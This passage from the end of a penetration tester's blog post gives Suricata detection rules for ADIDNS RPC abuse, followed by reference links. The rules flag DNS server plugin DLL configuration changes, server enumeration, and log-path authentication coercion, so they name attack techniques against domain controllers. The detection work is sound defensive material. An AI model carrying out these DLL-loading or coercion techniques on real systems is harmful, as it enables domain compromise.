  classtype:attempted-admin; reference:url, https://github.com/Paradoxis/DNSRPC-BOF; priority:1; sid:1000010; rev:1;
)

alert tcp any any -> any any (
  msg:"MRLN-SRT - Suspicious MS-DNSP (ADIDNS RPC) ServerLevelPluginDll configuration change request observed";
  flow:established,to_server;
  flowbits:isset,dcerpc.dnsserver_bind;
  content:"|05 00 00 03|"; offset:0; depth:4;
  content:"|05 00|"; distance:18; within:2;
  content:"ServerLevelPluginDll"; distance:0; nocase; fast_pattern;
  threshold:type limit,track by_src,count 1,seconds 600;
  classtype:attempted-admin; reference:url, https://github.com/Paradoxis/DNSRPC-BOF; priority:1; sid:1000011; rev:1;
)

alert tcp any any -> any any (
  msg:"MRLN-SRT - Suspicious MS-DNSP (ADIDNS RPC) ServerInfo enumeration request observed";
  flow:established,to_server;
  flowbits:isset,dcerpc.dnsserver_bind;
  content:"|05 00 00 03|"; offset:0; depth:4;
  content:"|06 00|"; distance:18; within:2;
  content:"ServerInfo"; distance:0; nocase; fast_pattern;
  threshold:type limit,track by_src,count 1,seconds 600;
  classtype:attempted-recon; reference:url, https://github.com/Paradoxis/DNSRPC-BOF; priority:2; sid:1000012; rev:1;
)

alert tcp any any -> any any (
  msg:"MRLN-SRT - Suspicious MS-DNSP (ADIDNS RPC) LogFilePath+ClearDebugLog coercion request observed 1/2";
  flow:established,to_server;
  flowbits:isset,dcerpc.dnsserver_bind;
  content:"|05 00 00 03|"; offset:0; depth:4;
  content:"|05 00|"; distance:18; within:2;
  content:"LogFilePath"; distance:0; nocase; fast_pattern; within:400;
  content:"|5c 00 5c 00|"; distance:0; within:50;
  flowbits:set,dnsrpc.logfilepath_call;
  flowbits:noalert;
  classtype:misc-attack; reference:url, https://github.com/Paradoxis/DNSRPC-BOF; priority:3; sid:1000013; rev:1;
)

alert tcp any any -> any any (
  msg:"MRLN-SRT - Suspicious MS-DNSP (ADIDNS RPC) LogFilePath+ClearDebugLog coercion request observed 2/2";
  flow:established,to_server;
  flowbits:isset,dnsrpc.logfilepath_call;
  content:"|05 00 00 03|"; offset:0; depth:4;
  content:"|05 00|"; distance:18; within:2;
  content:"ClearDebugLog"; distance:0; nocase; fast_pattern;
  threshold:type limit,track by_src,count 1,seconds 600;
  classtype:misc-attack; reference:url, https://github.com/Paradoxis/DNSRPC-BOF; priority:1; sid:1000014; rev:1;
)
```

¹ [https://medium.com/@esnesenon/feature-not-bug-dnsadmin-to-dc-compromise-in-one-line-a0f779b8dc83](https://medium.com/@esnesenon/feature-not-bug-dnsadmin-to-dc-compromise-in-one-line-a0f779b8dc83)

² [https://www.semperis.com/blog/dnsadmins-revisited/](https://www.semperis.com/blog/dnsadmins-revisited/)

³ [https://learn.microsoft.com/en-us/openspecs/windows\_protocols/ms-dnsp/a90a44f0-f64e-44b0-9e35-a7fc49f6adea](https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-dnsp/a90a44f0-f64e-44b0-9e35-a7fc49f6adea)

⁴ [https://learn.microsoft.com/en-us/openspecs/windows\_protocols/ms-dnsp/9500a7e8-165d-4b13-be86-0ddc43100eef](https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-dnsp/9500a7e8-165d-4b13-be86-0ddc43100eef)

⁵ [https://learn.microsoft.com/en-us/openspecs/windows\_protocols/ms-dnsp/8c0522b1-97fb-4fa7-b4e2-2c55c0afb0e7](https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-dnsp/8c0522b1-97fb-4fa7-b4e2-2c55c0afb0e7)

⁶ [https://github.com/trustedsec/coffloader](https://github.com/trustedsec/coffloader)

⁷ [https://learn.microsoft.com/en-us/windows/win32/rpc/rpctryexcept](https://learn.microsoft.com/en-us/windows/win32/rpc/rpctryexcept)

⁸ [https://learn.microsoft.com/en-us/windows/win32/api/errhandlingapi/nf-errhandlingapi-raiseexception](https://learn.microsoft.com/en-us/windows/win32/api/errhandlingapi/nf-errhandlingapi-raiseexception)

⁹ [https://learn.microsoft.com/en-us/cpp/c-runtime-library/reference/setjmp?view=msvc-170](https://learn.microsoft.com/en-us/cpp/c-runtime-library/reference/setjmp?view=msvc-170)

¹⁰ [https://learn.microsoft.com/en-us/cpp/c-runtime-library/reference/longjmp?view=msvc-170](https://learn.microsoft.com/en-us/cpp/c-runtime-library/reference/longjmp?view=msvc-170)

¹¹ [https://learn.microsoft.com/en-us/windows/win32/api/winternl/ns-winternl-teb](https://learn.microsoft.com/en-us/windows/win32/api/winternl/ns-winternl-teb)

¹² [https://devblogs.microsoft.com/oldnewthing/20190418-00/?p=102428](https://devblogs.microsoft.com/oldnewthing/20190418-00/?p=102428)

¹³ [https://geelaw.blog/entries/ps-start-process-usenewenvironment/](https://geelaw.blog/entries/ps-start-process-usenewenvironment/)

¹⁴ [https://learn.microsoft.com/en-us/windows/win32/api/winnt/nf-winnt-rtlcapturecontext](https://learn.microsoft.com/en-us/windows/win32/api/winnt/nf-winnt-rtlcapturecontext)

¹⁵ [https://learn.microsoft.com/en-us/windows/win32/api/winnt/nf-winnt-rtlrestorecontext](https://learn.microsoft.com/en-us/windows/win32/api/winnt/nf-winnt-rtlrestorecontext)

Rpc

Red Team

DNS

Offensive Security

Active Directory

[![Paradoxis](https://miro.medium.com/v2/resize:fill:96:96/1*OiBE_y2bgvQ_nz1k2orWIg.jpeg)](https://blog.paradoxis.nl/?source=post_page---post_publication_info--0c59c15d0a15---------------------------------------)

[![Paradoxis](https://miro.medium.com/v2/resize:fill:128:128/1*OiBE_y2bgvQ_nz1k2orWIg.jpeg)](https://blog.paradoxis.nl/?source=post_page---post_publication_info--0c59c15d0a15---------------------------------------)

Follow

[**Published in Paradoxis**](https://blog.paradoxis.nl/?source=post_page---post_publication_info--0c59c15d0a15---------------------------------------)

[130 followers](https://blog.paradoxis.nl/followers?source=post_page---post_publication_info--0c59c15d0a15---------------------------------------)

· [Last published Jul 15, 2026](https://blog.paradoxis.nl/escalating-all-the-privileges-with-foxit-pdf-reader-cve-2026-57239-582a78b60492?source=post_page---post_publication_info--0c59c15d0a15---------------------------------------)

Dutch penetration tester - Views expressed are my own and do not represent anyone else.

Follow

[![Luke Paris](https://miro.medium.com/v2/resize:fill:96:96/1*OiBE_y2bgvQ_nz1k2orWIg.jpeg)](https://medium.com/@paradoxis?source=post_page---post_author_info--0c59c15d0a15---------------------------------------)

[![Luke Paris](https://miro.medium.com/v2/resize:fill:128:128/1*OiBE_y2bgvQ_nz1k2orWIg.jpeg)](https://medium.com/@paradoxis?source=post_page---post_author_info--0c59c15d0a15---------------------------------------)

Follow

[**Written by Luke Paris**](https://medium.com/@paradoxis?source=post_page---post_author_info--0c59c15d0a15---------------------------------------)

[144 followers](https://medium.com/@paradoxis/followers?source=post_page---post_author_info--0c59c15d0a15---------------------------------------)

· [34 following](https://medium.com/@paradoxis/following?source=post_page---post_author_info--0c59c15d0a15---------------------------------------)

Dutch penetration tester - Views expressed are my own and do not represent anyone else.

Follow

[Help](https://help.medium.com/hc/en-us?source=post_page-----0c59c15d0a15---------------------------------------)

[Status](https://status.medium.com/?source=post_page-----0c59c15d0a15---------------------------------------)

[About](https://medium.com/about?autoplay=1&source=post_page-----0c59c15d0a15---------------------------------------)

[Careers](https://medium.com/jobs-at-medium/work-at-medium-959d1a85284e?source=post_page-----0c59c15d0a15---------------------------------------)

[Press](mailto:pressinquiries@medium.com)

[Blog](https://blog.medium.com/?source=post_page-----0c59c15d0a15---------------------------------------)

[Store](https://medium.com/store)

[Privacy](https://policy.medium.com/medium-privacy-policy-f03bf92035c9?source=post_page-----0c59c15d0a15---------------------------------------)

[Rules](https://policy.medium.com/medium-rules-30e5502c4eb4?source=post_page-----0c59c15d0a15---------------------------------------)

[Terms](https://policy.medium.com/medium-terms-of-service-9db0094a1e0f?source=post_page-----0c59c15d0a15---------------------------------------)

[Text to speech](https://speechify.com/medium?source=post_page-----0c59c15d0a15---------------------------------------)

reCAPTCHA

Recaptcha requires verification.

protected by **reCAPTCHA**